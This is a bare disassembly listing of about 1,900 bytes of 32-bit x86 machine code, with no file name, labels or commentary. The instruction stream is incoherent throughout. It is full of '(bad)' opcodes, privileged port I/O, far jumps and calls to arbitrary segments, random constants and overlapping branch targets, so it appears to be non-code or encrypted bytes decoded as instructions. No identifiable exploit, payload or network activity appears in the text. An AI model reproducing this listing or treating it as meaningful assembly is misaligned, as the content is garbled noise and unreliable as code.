  416d50:	ja     0x416dc8
  416d52:	adc    BYTE PTR [edi-0x7df004f8],dl
  416d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d59:	mov    ch,0x37
  416d5b:	mov    al,ds:0x439c6efd
  416d60:	(bad)  
  416d62:	xor    ah,BYTE PTR [edx-0x7d]
  416d65:	xchg   ecx,eax
  416d66:	loop   0x416d5c
  416d68:	inc    edx
  416d69:	retf   
  416d6a:	push   ebp
  416d6b:	xor    al,BYTE PTR [esi]
  416d6d:	cmp    eax,0xd85e41f5
  416d72:	jecxz  0x416d18
  416d74:	in     al,0x5b
  416d76:	pop    es
  416d77:	xchg   edi,eax
  416d78:	push   ds
  416d79:	rcl    DWORD PTR [eax],1
  416d7b:	sbb    ch,BYTE PTR [ebp-0x2680213e]
  416d81:	jne    0x1b35f477
  416d87:	inc    ebp
  416d88:	arpl   WORD PTR [esp+eiz*8-0x4ccb5e1c],si
  416d8f:	ds push ds
  416d91:	inc    ebp
  416d92:	shl    BYTE PTR [ebx-0x17130c7a],0x73
  416d99:	es es xchg edi,eax
  416d9c:	outs   dx,BYTE PTR ds:[esi]
  416d9d:	and    al,al
  416d9f:	xchg   DWORD PTR [ebx-0x5],ecx
  416da2:	add    ebx,DWORD PTR [esi+0x32c90834]
  416da8:	repz cmp eax,0xe3f5e789
  416dae:	ins    BYTE PTR es:[edi],dx
  416daf:	stc    
  416db0:	mov    bh,BYTE PTR [eax-0x72]
  416db3:	or     al,0xbb
  416db5:	std    
  416db6:	aas    
  416db7:	scas   al,BYTE PTR es:[edi]
  416db8:	pop    edi
  416db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dba:	adc    al,0x35
  416dbc:	repz xchg esp,eax
  416dbe:	fmul   QWORD PTR [edi-0x4cd6dc1b]
  416dc4:	int3   
  416dc5:	mov    ch,0xd8
  416dc7:	or     al,BYTE PTR [esp+eiz*4+0x55]
  416dcb:	mov    ah,0xcb
  416dcd:	out    dx,al
  416dce:	xchg   edi,eax
  416dcf:	nop
  416dd0:	push   edi
  416dd1:	je     0x416dc1
  416dd3:	sbb    edi,esp
  416dd5:	or     BYTE PTR [eax+0x3eb891c9],cl
  416ddb:	fucom  st(5)
  416ddd:	add    bh,BYTE PTR [eax]
  416ddf:	add    eax,DWORD PTR ds:0xed67cb33
  416de5:	jp     0x416e2d
  416de7:	aam    0x66
  416de9:	fidivr WORD PTR [edi-0x76]
  416dec:	int3   
  416ded:	test   DWORD PTR [eax+eiz*8-0x2cbd94a2],eax
  416df4:	pusha  
  416df5:	xor    al,0x54
  416df7:	or     BYTE PTR ds:[ebp-0x266513a],dh
  416dfe:	push   cs
  416dff:	das    
  416e00:	imul   ebp,DWORD PTR [edi],0xffffff85
  416e03:	es push ebx
  416e05:	cmc    
  416e06:	jmp    0xd29c5231
  416e0b:	mov    edx,0xe6e258d3
  416e10:	imul   esp,DWORD PTR [ebp-0x41],0x41b94dc2
  416e17:	cmp    eax,0xdbedf6fa
  416e1c:	and    al,0xa8
  416e1e:	xor    ecx,esp
  416e20:	test   al,0xa3
  416e22:	into   
  416e23:	in     al,dx
  416e24:	stc    
  416e25:	mov    WORD PTR [ecx-0xb895b13],gs
  416e2b:	sahf   
  416e2c:	lods   al,BYTE PTR ds:[esi]
  416e2d:	or     al,0x7d
  416e2f:	loope  0x416e32
  416e31:	imul   esi,DWORD PTR [ecx+0x1a5dae94],0x40
  416e38:	addr16 push ebp
  416e3a:	jg     0x416e90
  416e3c:	sahf   
  416e3d:	cmp    edx,ebx
  416e3f:	jne    0x416e95
  416e41:	imul   edx,DWORD PTR [esi-0x37],0x471c7838
  416e48:	popf   
  416e49:	lds    esi,FWORD PTR [edx-0x17]
  416e4c:	jnp    0x416e19
  416e4e:	nop
  416e4f:	pop    ecx
  416e50:	test   ch,dl
  416e52:	cs (bad) 
  416e54:	mov    edi,0x2d41a9cc
  416e59:	pusha  
  416e5a:	idiv   bl
  416e5c:	cmc    
  416e5d:	iret   
  416e5e:	int3   
  416e5f:	mov    BYTE PTR [edx-0x60],bh
  416e62:	fld    QWORD PTR [eax-0x26]
  416e65:	push   esp
  416e66:	mov    esp,0xa0e4a67d
  416e6b:	int3   
  416e6c:	push   ebp
  416e6d:	add    esi,DWORD PTR [edi]
  416e6f:	pusha  
  416e70:	mov    ebx,ebx
  416e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e73:	push   eax
  416e74:	test   al,0xc4
  416e76:	dec    ebx
  416e77:	mov    ch,0x66
  416e79:	cmp    eax,0xd1f49324
  416e7e:	das    
  416e7f:	imul   DWORD PTR [eax]
  416e81:	pop    edx
  416e82:	imul   edx,ebx,0x1bd62202
  416e88:	outs   dx,BYTE PTR ds:[esi]
  416e89:	ins    BYTE PTR es:[edi],dx
  416e8a:	rol    BYTE PTR [esi+0x5d],1
  416e8d:	sbb    esp,DWORD PTR [ecx+0x4c4f5b17]
  416e93:	mov    ebp,fs
  416e95:	add    BYTE PTR [edi*2-0x29cfc229],ah
  416e9c:	and    eax,0xe8d21a46
  416ea1:	adc    edx,edi
  416ea3:	push   cs
  416ea4:	aad    0x22
  416ea6:	repnz xchg ecx,eax
  416ea8:	test   al,0x4a
  416eaa:	jl     0x416ed9
  416eac:	test   al,0xa0
  416eae:	cmp    ebp,edx
  416eb0:	push   esp
  416eb1:	xchg   DWORD PTR [esp+ebx*8-0x1b321969],ebx
  416eb8:	sub    esi,DWORD PTR [eax]
  416eba:	xor    eax,0x2b7f2ac3
  416ebf:	cmp    ebx,DWORD PTR [esi+0x44]
  416ec2:	shr    BYTE PTR [ecx],1
  416ec4:	enter  0x8fd4,0x57
  416ec8:	(bad)  
  416ec9:	call   0x618bb6f1
  416ece:	aas    
  416ecf:	dec    edx
  416ed0:	hlt    
  416ed1:	js     0x416eb1
  416ed3:	outs   dx,BYTE PTR fs:[esi]
  416ed5:	cmc    
  416ed6:	jnp    0x416f4c
  416ed8:	mov    dl,0x54
  416eda:	inc    edx
  416edb:	push   edx
  416edc:	(bad)  
  416edd:	test   DWORD PTR [ebx+0xa],0xca8e4168
  416ee4:	iret   
  416ee5:	cmc    
  416ee6:	mov    eax,ds:0x4645b744
  416eeb:	and    edi,eax
  416eed:	pop    ebx
  416eee:	add    dl,BYTE PTR [eax-0x10]
  416ef1:	cmp    DWORD PTR [ebp+0x19],ecx
  416ef4:	xchg   ecx,eax
  416ef5:	mov    bh,0x35
  416ef7:	dec    esp
  416ef8:	fadd   QWORD PTR [ebp-0x3522ac7c]
  416efe:	cmp    bh,BYTE PTR [eax+0x62]
  416f01:	add    DWORD PTR [edx],ebx
  416f03:	cmp    dl,BYTE PTR ds:0x97b6e729
  416f09:	sti    
  416f0a:	mov    bl,0x41
  416f0c:	push   0x67
  416f0e:	mov    ds:0x43d5d712,eax
  416f13:	jg     0x416f70
  416f15:	call   0x6a0f314
  416f1a:	pop    ebp
  416f1b:	jge    0x416eb2
  416f1d:	shl    DWORD PTR [esi],1
  416f1f:	mov    bl,0xf0
  416f21:	push   edx
  416f22:	icebp  
  416f23:	push   ebx
  416f24:	push   es
  416f25:	lds    edi,FWORD PTR [edi+edi*2]
  416f28:	inc    esi
  416f29:	clc    
  416f2a:	mov    eax,ds:0xfae74c15
  416f2f:	enter  0x3f1f,0x5c
  416f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f34:	retf   
  416f35:	mov    ds:0x91f72872,eax
  416f3a:	jae    0x416ec4
  416f3c:	fldcw  WORD PTR [ebp+eax*4-0x560c5efe]
  416f43:	jecxz  0x416f57
  416f45:	jg     0x416f65
  416f47:	inc    edx
  416f48:	into   
  416f49:	xor    DWORD PTR [esi+ecx*8],edx
  416f4c:	jo     0x416f45
  416f4e:	enter  0x23fc,0x85
  416f52:	adc    edi,DWORD PTR [ebp-0x35]
  416f55:	mov    al,0xd7
  416f57:	push   ebx
  416f58:	or     esp,edi
  416f5a:	imul   edi,DWORD PTR ds:[eax],0x969e33f6
  416f61:	loope  0x416faa
  416f63:	xor    dh,BYTE PTR [edi+0x6a]
  416f66:	outs   dx,BYTE PTR ds:[esi]
  416f67:	mov    edx,DWORD PTR [esi+0x37014f6c]
  416f6d:	test   BYTE PTR [edi+0x6157af55],bl
  416f73:	ret    0x2488
  416f76:	outs   dx,DWORD PTR ds:[esi]
  416f77:	icebp  
  416f78:	mov    BYTE PTR [edx-0x39514e86],dh
  416f7e:	test   DWORD PTR [ebp-0x4fe82b24],0xf781350
  416f88:	cli    
  416f89:	popf   
  416f8a:	gs xchg ebx,eax
  416f8c:	add    BYTE PTR [edi],ch
  416f8e:	sbb    si,ax
  416f91:	das    
  416f92:	inc    edx
  416f93:	dec    DWORD PTR [edx+0x205d4c55]
  416f99:	hlt    
  416f9a:	sub    eax,0x291e2e8b
  416f9f:	mov    BYTE PTR [ebx-0x7],0x67
  416fa3:	cmp    cl,BYTE PTR [edx]
  416fa5:	add    BYTE PTR [edi+0x67],bh
  416fa8:	ret    0x2b23
  416fab:	or     esi,DWORD PTR ds:0x7febfdf8
  416fb1:	xchg   edx,eax
  416fb2:	call   ebp
  416fb4:	lock fld DWORD PTR [edi-0x1f]
  416fb8:	scas   eax,DWORD PTR es:[edi]
  416fb9:	xchg   edi,eax
  416fba:	out    dx,eax
  416fbb:	pushf  
  416fbc:	xchg   esp,eax
  416fbd:	dec    edx
  416fbe:	xor    eax,0x83232ece
  416fc3:	xor    al,0x91
  416fc5:	sti    
  416fc6:	mov    esi,0x471bf6d3
  416fcb:	sub    al,0x1a
  416fcd:	fcomp  QWORD PTR [edx]
  416fcf:	nop
  416fd0:	in     eax,dx
  416fd1:	sub    al,0x98
  416fd3:	mov    ecx,0x8d007036
  416fd8:	push   eax
  416fd9:	retf   
  416fda:	rcr    BYTE PTR [esi-0x780d81de],1
  416fe0:	pop    edx
  416fe1:	and    eax,ecx
  416fe3:	leave  
  416fe4:	inc    ecx
  416fe5:	lea    edx,[esi]
  416fe7:	inc    edx
  416fe8:	pop    eax
  416fe9:	cmp    eax,0x361556d4
  416fee:	pop    ebp
  416fef:	test   al,0x22
  416ff1:	jno    0x417025
  416ff3:	add    al,cl
  416ff5:	jmp    0x416fa5
  416ff7:	jo     0x416fb4
  416ff9:	sbb    ebp,DWORD PTR [ecx]
  416ffb:	inc    ebx
  416ffc:	pop    ds
  416ffd:	int3   
  416ffe:	fisub  DWORD PTR ds:0xb029b5d1
  417004:	cld    
  417005:	mov    esp,0x76b843c9
  41700a:	nop
  41700b:	mov    bh,0x2a
  41700d:	cdq    
  41700e:	cmp    eax,DWORD PTR [esi+ebp*4-0x5ece5ea6]
  417015:	xchg   BYTE PTR [eax+0x50],dl
  417018:	adc    al,0xb9
  41701a:	sbb    BYTE PTR ds:0x3bcb9646,bh
  417020:	packssdw mm5,QWORD PTR [esi+0x42]
  417024:	dec    ebp
  417025:	mov    BYTE PTR [edx+0x29b1f20f],dl
  41702b:	mov    cl,0x46
  41702d:	add    dh,al
  41702f:	sbb    DWORD PTR [edx+0x7b],0xffffffda
  417033:	sub    dl,dl
  417035:	mov    eax,0x8ebec4e7
  41703a:	cld    
  41703b:	call   0x949c7a14
  417040:	and    dl,bh
  417042:	xchg   ebx,eax
  417043:	cld    
  417044:	outs   dx,BYTE PTR ds:[esi]
  417045:	cli    
  417046:	xor    BYTE PTR [ebx+0x2db692c7],al
  41704c:	icebp  
  41704d:	jp     0x416ff1
  41704f:	repnz loop 0x4170a0
  417052:	xchg   ebx,eax
  417053:	mov    DWORD PTR [eax],edx
  417055:	pusha  
  417056:	mov    ah,0x8f
  417058:	fidiv  DWORD PTR [edi]
  41705a:	push   es
  41705b:	cmp    eax,0x68389e0a
  417060:	daa    
  417061:	lods   eax,DWORD PTR ds:[esi]
  417062:	xchg   ecx,eax
  417063:	xor    eax,0x9f769d90
  417068:	inc    esp
  417069:	lock or al,0xef
  41706c:	popf   
  41706d:	jne    0x416fff
  41706f:	popa   
  417070:	sub    DWORD PTR [ebp-0x4b787185],0xbc843118
  41707a:	fldenv [eax*1-0x26146f00]
  417081:	pushf  
  417082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417083:	les    edx,FWORD PTR [ebp+0x64]
  417086:	stc    
  417087:	xor    DWORD PTR [ecx],eax
  417089:	adc    ecx,DWORD PTR [ecx-0x6f1eaecf]
  41708f:	inc    ebp
  417090:	shl    DWORD PTR [edi],0x74
  417093:	scas   al,BYTE PTR es:[edi]
  417094:	(bad)  
  417095:	sti    
  417096:	aas    
  417097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417098:	xchg   ebp,eax
  417099:	jb     0x4170c8
  41709b:	mov    eax,ds:0x5585b3b2
  4170a0:	repz jno 0x417067
  4170a3:	sahf   
  4170a4:	cmp    DWORD PTR [esi],ebp
  4170a6:	cs jns 0x4170e7
  4170a9:	out    dx,al
  4170aa:	jl     0x417084
  4170ac:	aas    
  4170ad:	retf   
  4170ae:	inc    edi
  4170af:	add    BYTE PTR [eax+0xfbf4ba4],bh
  4170b5:	mov    bl,0x7a
  4170b7:	ss or  edx,ebp
  4170ba:	jne    0x417042
  4170bc:	retf   
  4170bd:	retf   
  4170be:	les    esp,FWORD PTR [esi+0x68776f34]
  4170c4:	out    dx,al
  4170c5:	mov    esp,0x61e9739f
  4170ca:	and    DWORD PTR [ebp-0x2265aa2a],edi
  4170d0:	push   ss
  4170d1:	loopne 0x417117
  4170d3:	(bad)  
  4170d4:	jg     0x4170f3
  4170d6:	test   eax,0x88b70c4b
  4170db:	xchg   edx,eax
  4170dc:	jle    0x41712c
  4170de:	pop    es
  4170df:	push   esp
  4170e0:	pop    edx
  4170e1:	fisub  DWORD PTR [esi]
  4170e3:	dec    ebx
  4170e4:	imul   edx,DWORD PTR [ecx],0x37
  4170e7:	adc    cl,BYTE PTR [eax+0x22ed495a]
  4170ed:	out    dx,al
  4170ee:	fistp  DWORD PTR [esi+0x10]
  4170f1:	push   es
  4170f2:	adc    edi,DWORD PTR [eax+0x39]
  4170f5:	jge    0x417080
  4170f7:	push   ecx
  4170f8:	cmp    ch,dh
  4170fa:	sti    
  4170fb:	ins    BYTE PTR es:[edi],dx
  4170fc:	adc    dl,BYTE PTR [esi+eiz*2]
  4170ff:	addr16 in eax,dx
  417101:	and    eax,0x511ee1fb
  417106:	push   0xffffffe3
  417108:	xchg   edx,eax
  417109:	and    edx,DWORD PTR [ecx+0x78]
  41710c:	sbb    BYTE PTR [ebx-0x66],bh
  41710f:	scas   eax,DWORD PTR es:[edi]
  417110:	pop    ebp
  417111:	pop    ss
  417112:	retf   0xc386
  417115:	xchg   cl,dh
  417117:	mov    esp,0x218a6903
  41711c:	cmp    ebx,ebx
  41711e:	xor    eax,0x845cf946
  417123:	cmp    dh,bh
  417125:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417127:	ins    DWORD PTR es:[edi],dx
  417128:	fidiv  WORD PTR [edx-0x4948ef5c]
  41712e:	js     0x4170c5
  417130:	inc    esi
  417131:	or     edx,esi
  417133:	gs push ebx
  417135:	rcr    BYTE PTR [edx],cl
  417137:	pop    edi
  417138:	cdq    
  417139:	push   0xffffffbd
  41713b:	jb     0x417180
  41713d:	(bad)  
  41713e:	or     al,bl
  417140:	out    dx,eax
  417141:	mov    bl,0x98
  417143:	in     al,0xf8
  417145:	cmp    eax,0x318ee401
  41714a:	add    bl,BYTE PTR ds:0xebcbc507
  417150:	add    ecx,DWORD PTR [ebx]
  417152:	sub    al,0x4c
  417154:	inc    esi
  417155:	sub    DWORD PTR [esi],ebx
  417157:	xor    al,0x9f
  417159:	repz stc 
  41715b:	data16 sti 
  41715d:	jno    0x417102
  41715f:	push   es
  417160:	cmp    ch,0x5c
  417163:	cmc    
  417164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417165:	or     edi,DWORD PTR [ebx+0x40]
  417168:	pop    es
  417169:	cmp    BYTE PTR [ecx],dl
  41716b:	pop    esp
  41716c:	push   ss
  41716d:	aam    0xb6
  41716f:	rcl    DWORD PTR [edx],0x5a
  417172:	jae    0x4171e5
  417174:	push   edx
  417175:	xor    dl,BYTE PTR [edi+0x94dbb4]
  41717b:	dec    ebp
  41717c:	sar    BYTE PTR [ebx+eiz*4+0x1031cb86],0x3c
  417184:	jecxz  0x41711c
  417186:	ss push ebx
  417188:	jp     0x417189
  41718a:	xchg   esi,eax
  41718b:	loope  0x4171a4
  41718d:	push   esi
  41718e:	push   cs
  41718f:	int    0xfa
  417191:	add    edx,esp
  417193:	shl    DWORD PTR [esi+0x519c3616],cl
  417199:	mov    ds:0x8507410c,al
  41719e:	jno    0x41720f
  4171a0:	jmp    0xf42e:0x47c3f578
  4171a7:	xor    al,0x41
  4171a9:	fmul   DWORD PTR ds:0xcb148f11
  4171af:	out    0x1b,al
  4171b1:	xchg   eax,esi
  4171b3:	mov    ch,BYTE PTR [edi+0x5a95e4b7]
  4171b9:	adc    DWORD PTR [ebx+0x2e],edi
  4171bc:	cli    
  4171bd:	sub    DWORD PTR [edx+0x1b71eefc],0xffffff90
  4171c4:	sub    BYTE PTR [edx],ch
  4171c6:	hlt    
  4171c7:	ret    
  4171c8:	sbb    ch,ah
  4171ca:	push   eax
  4171cb:	bound  edx,QWORD PTR [ecx-0x51]
  4171ce:	iret   
  4171cf:	lock mov ah,0x88
  4171d2:	push   cs
  4171d3:	xchg   edi,eax
  4171d4:	call   0xae83:0xfa66b3c8
  4171db:	bound  ebx,QWORD PTR ds:0xb7018390
  4171e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e2:	pop    eax
  4171e3:	mov    eax,ds:0xc529ee46
  4171e8:	mov    ebp,0x889e86d1
  4171ed:	push   es
  4171ee:	repnz xchg edx,eax
  4171f0:	outs   dx,BYTE PTR ds:[esi]
  4171f1:	mov    ah,0xa0
  4171f3:	push   ss
  4171f4:	popf   
  4171f5:	mov    eax,ds:0xd29f890c
  4171fa:	loop   0x4171d5
  4171fc:	in     al,dx
  4171fd:	mov    ds:0xa22f1e1e,al
  417202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417203:	dec    esi
  417204:	adc    al,0x7b
  417206:	fdivrp st(0),st
  417208:	mov    ebx,0xfee2b667
  41720d:	outs   dx,BYTE PTR ds:[esi]
  41720e:	ins    DWORD PTR es:[di],dx
  417210:	stc    
  417211:	and    eax,0xb0c9921c
  417216:	push   ecx
  417217:	stos   BYTE PTR es:[edi],al
  417218:	aad    0xb3
  41721a:	bound  ecx,QWORD PTR [eax+0x28d3bd7f]
  417220:	jmp    0x41724b
  417222:	stc    
  417223:	(bad)  
  417224:	leave  
  417225:	and    DWORD PTR [ebp-0x6d6780b8],edx
  41722b:	enter  0x807c,0x70
  41722f:	fcmovnu st,st(5)
  417231:	jp     0x417282
  417233:	mov    ecx,0xe1ad2196
  417238:	inc    esi
  417239:	int3   
  41723a:	sub    ch,BYTE PTR [eax]
  41723c:	mov    dl,0x6b
  41723e:	mov    bh,0x61
  417240:	mov    ah,BYTE PTR [ebp+0x3d]
  417243:	cmp    cl,BYTE PTR [edi-0x60b6e41b]
  417249:	rcl    DWORD PTR [esi-0x6e],0xa
  41724d:	inc    ecx
  41724e:	cmp    bh,BYTE PTR [esi+0x7]
  417251:	lock mov esp,0xa3cea39c
  417257:	cli    
  417258:	or     BYTE PTR [ecx-0x6105cf98],al
  41725e:	jle    0x417269
  417260:	cmp    BYTE PTR [edx],dl
  417262:	push   cs
  417263:	mul    DWORD PTR [ecx-0x21021ec9]
  417269:	imul   eax,DWORD PTR [ebx-0x25],0xffffffc0
  41726d:	lds    ebp,FWORD PTR [edx]
  41726f:	and    al,0xd5
  417271:	push   0xfb4828da
  417276:	xor    BYTE PTR [eax-0x7e],0x57
  41727a:	and    esi,esp
  41727c:	lods   al,BYTE PTR ds:[esi]
  41727d:	lods   al,BYTE PTR ds:[esi]
  41727e:	or     esi,eax
  417280:	inc    ebx
  417281:	dec    edi
  417282:	jnp    0x4172eb
  417284:	test   eax,0x1e57b0b5
  417289:	cmc    
  41728a:	arpl   WORD PTR [ecx+0x47],bx
  41728d:	push   es
  41728e:	mov    dh,0xd5
  417290:	dec    esp
  417291:	sub    al,ch
  417293:	push   esi
  417294:	out    dx,eax
  417295:	in     eax,0xde
  417297:	aam    0x70
  417299:	adc    al,0x91
  41729b:	ret    0xb26f
  41729e:	push   es
  41729f:	adc    DWORD PTR [eax],eax
  4172a1:	dec    ebx
  4172a2:	jae    0x417236
  4172a4:	adc    ch,dh
  4172a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172a7:	pop    ebx
  4172a8:	out    0x7a,al
  4172aa:	pop    ss
  4172ab:	push   edi
  4172ac:	add    BYTE PTR [ebp-0x5a],bh
  4172af:	mov    esp,0xbf1e90c8
  4172b4:	inc    ebx
  4172b5:	push   edi
  4172b6:	push   eax
  4172b7:	fwait
  4172b8:	cmp    DWORD PTR [esi-0x2cf7ffad],edi
  4172be:	(bad)  
  4172bf:	adc    DWORD PTR [eax+0x4b8d2640],edi
  4172c5:	dec    ebx
  4172c6:	lahf   
  4172c7:	xchg   ebp,eax
  4172c8:	sahf   
  4172c9:	or     al,0xc5
  4172cb:	inc    eax
  4172cc:	xchg   ebp,eax
  4172cd:	ins    BYTE PTR es:[edi],dx
  4172ce:	inc    ebx
  4172cf:	fimul  WORD PTR [esi-0x7c53f3ad]
  4172d5:	xor    dh,BYTE PTR [ebx-0x26]
  4172d8:	imul   ebx,DWORD PTR [ebx-0x4924992],0x90d048bf
  4172e2:	fwait
  4172e3:	xchg   ecx,eax
  4172e4:	ins    BYTE PTR es:[edi],dx
  4172e5:	push   0xbec1aa5a
  4172ea:	pusha  
  4172eb:	mov    BYTE PTR [edx-0x7e],ch
  4172ee:	xchg   DWORD PTR [edx],ebp
  4172f0:	retf   
  4172f1:	lock sbb BYTE PTR [edi+edx*2],dh
  4172f5:	and    cl,bl
  4172f7:	push   esi
  4172f8:	inc    eax
  4172f9:	xchg   edi,eax
  4172fa:	sub    DWORD PTR fs:0x538883a3,edx
  417301:	xchg   DWORD PTR [eax+0x73],esi
  417304:	je     0x417294
  417306:	adc    ah,BYTE PTR [esi+0x22c4a8fe]
  41730c:	rcl    esp,1
  41730e:	ins    DWORD PTR es:[edi],dx
  41730f:	(bad)  
  417310:	icebp  
  417311:	adc    eax,0xc26644ff
  417316:	sbb    al,0x62
  417318:	mov    dh,0x4a
  41731a:	adc    al,0xf6
  41731d:	or     esp,esi
  41731f:	ror    DWORD PTR [edx],1
  417321:	push   0xffffffdf
  417323:	and    al,0x1b
  417325:	sub    eax,DWORD PTR [esi-0xb827b7b]
  41732b:	aaa    
  41732c:	int    0x9a
  41732e:	rol    ch,cl
  417330:	or     al,0x41
  417332:	mov    BYTE PTR [edi-0x557624a],bl
  417338:	adc    eax,0xa88f7d48
  41733d:	sbb    eax,0x3be17da5
  417342:	xchg   esi,eax
  417343:	rcl    DWORD PTR [esi+edx*8],1
  417346:	(bad)  
  417347:	adc    al,0x70
  417349:	jno    0x4172d7
  41734b:	dec    ecx
  41734c:	mov    ebp,DWORD PTR [eax+0x50]
  41734f:	and    bl,BYTE PTR [edx+0x1eb2f4de]
  417355:	fild   WORD PTR [ebp-0x49cfef91]
  41735b:	int    0xbe
  41735d:	inc    ebp
  41735e:	mov    eax,0x6cc4cb5a
  417363:	call   DWORD PTR [ecx-0x56255648]
  417369:	push   ebx
  41736a:	popf   
  41736b:	shl    cl,cl
  41736d:	push   ebx
  41736e:	push   0xae45e840
  417373:	cmp    cl,BYTE PTR [eax+0x26bf58c8]
  417379:	mov    DWORD PTR [ecx-0x1],esi
  41737c:	bswap  ebp
  41737e:	mov    cl,0xba
  417380:	mov    bl,0x93
  417382:	js     0x417320
  417384:	adc    DWORD PTR [ebx-0x66],esp
  417387:	imul   eax,DWORD PTR [edi+0x1d4902c7],0x25
  41738e:	xor    ah,ah
  417390:	or     cl,BYTE PTR [esi-0x78307d89]
  417396:	aad    0x48
  417398:	add    bl,BYTE PTR [edi-0x7bfa2238]
  41739e:	icebp  
  41739f:	jmp    0x4173c2
  4173a1:	add    BYTE PTR ds:0x23b811c,ah
  4173a7:	jae    0x41738c
  4173a9:	add    DWORD PTR [ebx-0x28],eax
  4173ac:	imul   edi,edx,0x55052feb
  4173b2:	and    DWORD PTR [edx],ebx
  4173b4:	in     al,dx
  4173b5:	call   0x28af2b9a
  4173ba:	mov    BYTE PTR [edx-0x12ad7342],ah
  4173c0:	arpl   WORD PTR [ebx-0x2115b756],cx
  4173c6:	cmp    esp,eax
  4173c8:	cdq    
  4173c9:	inc    esp
  4173ca:	mov    esi,eax
  4173cc:	push   esi
  4173cd:	cmp    DWORD PTR [ebx-0xbfbee81],edi
  4173d3:	jge    0x41736d
  4173d5:	lods   al,BYTE PTR ds:[esi]
  4173d6:	ret    
  4173d7:	or     ah,BYTE PTR [edx-0x5b]
  4173da:	dec    ch
  4173dc:	ret    
  4173dd:	stos   DWORD PTR es:[edi],eax
  4173de:	retf   
  4173df:	scas   eax,DWORD PTR es:[edi]
  4173e0:	sub    esp,DWORD PTR [edx]
  4173e2:	shr    BYTE PTR [edx+0x564ea82f],1
  4173e8:	ret    
  4173e9:	cmp    ebx,eax
  4173eb:	cli    
  4173ec:	cmp    al,0xb9
  4173ee:	push   ss
  4173ef:	pop    ebp
  4173f0:	ret    
  4173f1:	jbe    0x4173b7
  4173f3:	int3   
  4173f4:	pushf  
  4173f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f6:	mov    bh,BYTE PTR [edi]
  4173f8:	xchg   edi,eax
  4173f9:	or     DWORD PTR [ebx],ebp
  4173fb:	rcr    DWORD PTR [edi+0x7d],0x80
  4173ff:	cdq    
  417400:	sub    esi,DWORD PTR [esi+0x78]
  417403:	xchg   edi,eax
  417404:	(bad)  
  417405:	ret    
  417406:	add    DWORD PTR [edx+ebx*1+0x4cd4ddf2],ecx
  41740d:	sub    BYTE PTR [eax-0x1],ch
  417410:	jl     0x41741c
  417412:	repnz (bad) 
  417415:	or     eax,0x14847dac
  41741a:	(bad)  
  41741b:	shr    BYTE PTR [eax],1
  41741d:	ss cmp al,0xb6
  417420:	leave  
  417421:	hlt    
  417422:	in     al,dx
  417423:	popa   
  417424:	xor    al,0xf8
  417426:	xchg   DWORD PTR [ecx+0xc49b41c],ebp
  41742c:	jp     0x41741b
  41742e:	xor    eax,0x77fcba5c
  417433:	xchg   ecx,eax
  417434:	pop    eax
  417435:	xor    eax,0x177a97b2
  41743a:	sub    edi,DWORD PTR [ebx+0x30ec8cb0]
  417440:	or     DWORD PTR [ebp-0x19],ebp
  417443:	push   0xec22e802
  417448:	push   0x68dadbb3
  41744d:	mov    ds:0x12651c17,al
  417452:	xchg   ebx,eax
  417453:	(bad)  
  417454:	loopne 0x4173fa
  417456:	dec    ebp
  417457:	add    BYTE PTR [ecx+0x384f2b69],dh
  41745d:	push   ebx
  41745e:	ss push cs
  417460:	dec    dh
  417462:	mov    dh,0x80
  417464:	mov    cl,0x2a
  417466:	mov    edx,0x66074d40
  41746b:	xchg   edi,eax
  41746c:	push   cs
  41746d:	xor    eax,0x4cea0af4
  417472:	rol    ebp,1
  417474:	jecxz  0x41744b
  417476:	cld    
  417477:	xchg   edi,eax
  417478:	addr16 test ecx,0xd6d2a1e3
  41747f:	ret    
  417480:	jg     0x417435
  417482:	bound  eax,QWORD PTR [esi+0x20]
  417485:	std    
  417486:	sbb    bl,BYTE PTR [ebx+edx*4+0x7]
  41748a:	fidiv  DWORD PTR [ecx+0x2a]
  41748d:	xor    edx,DWORD PTR [ecx+0x4e]
  417490:	dec    BYTE PTR [edi]
  417492:	pop    eax
  417493:	popa   
  417494:	jmp    0xeb28:0xdfefc26d
  41749b:	stos   BYTE PTR es:[edi],al
  41749c:	push   edx
  41749d:	rol    esp,0x93
  4174a0:	adc    DWORD PTR [ebx+0x3e],ecx
  4174a3:	pushf  
  4174a4:	push   0xffffffcc
  4174a6:	lods   al,BYTE PTR ds:[esi]
  4174a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a8:	out    dx,al
  4174a9:	xchg   DWORD PTR [edx-0x55],ebp
  4174ac:	and    BYTE PTR [edx],0x4b
  4174af:	jno    0x417489
  4174b1:	jmp    0xaf82ac64
  4174b6:	inc    esp
  4174b7:	out    dx,eax
  4174b8:	nop
  4174b9:	inc    ecx
  4174ba:	dec    ebx
  4174bb:	retf   0x2308
  4174be:	inc    esp
  4174bf:	push   eax
  4174c0:	sahf   
  4174c1:	push   cs
  4174c2:	jnp    0x4174ff
  4174c4:	out    dx,eax
  4174c5:	mov    esi,0x92133529
  4174ca:	fcmovnb st,st(1)
  4174cc:	nop
  4174cd:	sbb    edx,DWORD PTR [esi-0x7bb82257]
  4174d3:	das    
  4174d4:	mov    ds:0x4b99e2fc,al
  4174d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174da:	adc    esp,DWORD PTR [edx+0x1d8c49f5]
  4174e0:	sub    al,0x93
  4174e2:	cmp    ebx,ebx
  4174e4:	xor    BYTE PTR ds:[edx],bl
  4174e7:	or     bh,bh
  4174e9:	int3   
  4174ea:	push   edx
  4174eb:	ins    DWORD PTR es:[edi],dx
  4174ec:	cs add eax,0x36e662fa
  4174f2:	dec    ebp
  4174f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f4:	mov    edi,DWORD PTR [ebx-0x3a7408e2]
  4174fa:	(bad)  
  4174fb:	lods   al,BYTE PTR ds:[esi]
  4174fc:	and    al,0x79
  4174fe:	pop    esi
